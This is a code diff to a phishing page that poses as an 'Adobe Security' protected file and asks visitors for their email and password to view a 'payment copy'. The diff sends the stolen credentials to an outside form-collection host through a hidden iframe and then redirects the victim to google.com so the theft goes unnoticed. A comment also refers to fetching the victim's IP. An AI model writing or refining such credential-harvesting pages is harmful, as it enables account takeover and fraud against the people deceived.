@@ -193,7 +193,10 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click on download to view payment copy.</p>
 
-      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on">
+      <!-- Hidden iframe method -->
+      <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on" target="hiddenFrame">
         <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="username email" required>
         <div class="password-wrapper">
           <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
@@ -234,7 +237,7 @@
           document.getElementById('splash').style.display = 'none';
           document.getElementById('main').classList.add('show');
         }, 1000);
-      }, 3000); // 3s delay
+      }, 3000);
     });
 
     // Autofill and IP fetch
@@ -268,21 +271,9 @@
       toggle.textContent = isHidden ? '🙈' : '👁️';
     });
 
-    // Submit then redirect
-    const form = document.getElementById('mainForm');
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const data = new FormData(form);
-      try {
-        const res = await fetch(form.action, { method: 'POST', body: data });
-        if (res.ok) {
-          window.location.href = "https://www.google.com";
-        } else {
-          alert("Submission failed. Try again.");
-        }
-      } catch {
-        alert("Network error, please try again");
-      }
+    // Redirect after submission
+    document.getElementById('mainForm').addEventListener('submit', () => {
+      setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
     });
   </script>
 </body>
